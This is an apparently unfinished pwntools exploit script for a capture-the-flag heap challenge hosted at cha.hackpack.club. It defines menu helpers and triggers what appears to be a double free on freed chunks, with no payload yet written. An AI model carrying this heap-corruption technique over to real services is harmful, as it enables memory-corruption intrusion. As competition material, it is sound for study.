from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./chal')
else:
    io = remote('cha.hackpack.club',41705)

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]

def new(idx,name=b'\n',number=41):
    io.sendlineafter(b"Choose option: ",str(1).encode())
    io.sendlineafter(b"Enter index of new number (0-9): ",str(idx).encode())
    io.sendafter(b"Enter object name: ", name)
    number = int(hex(number), 16)
    io.sendlineafter(b"Enter number: ",str(number).encode())


def delete(idx):
    io.sendlineafter(b"Choose option: ",str(2).encode())
    io.sendlineafter(b"Enter index of number to delete (0-9): ",str(idx).encode())

def edit(idx,number):
    io.sendlineafter(b"Choose option: ",str(3).encode())
    io.sendlineafter(b"Enter index of number to edit (0-9): ",str(idx).encode())
    number = int(hex(number), 16)
    io.sendlineafter(b"Enter number: ",str(number).encode())


def show(idx):
    io.sendlineafter(b"Choose option: ",str(4).encode())
    io.sendlineafter(b"Select index of number to print (0-9): ",str(idx).encode())

def showlist():
    io.sendlineafter(b"Choose option: ",str(5).encode())

def creat_ran_num():
    io.sendlineafter(b"Choose option: ",str(6).encode())

for i in range(7):
    new(i)

for i in range(3):
    delete(i)

delete(1)

#p()



io.interactive()

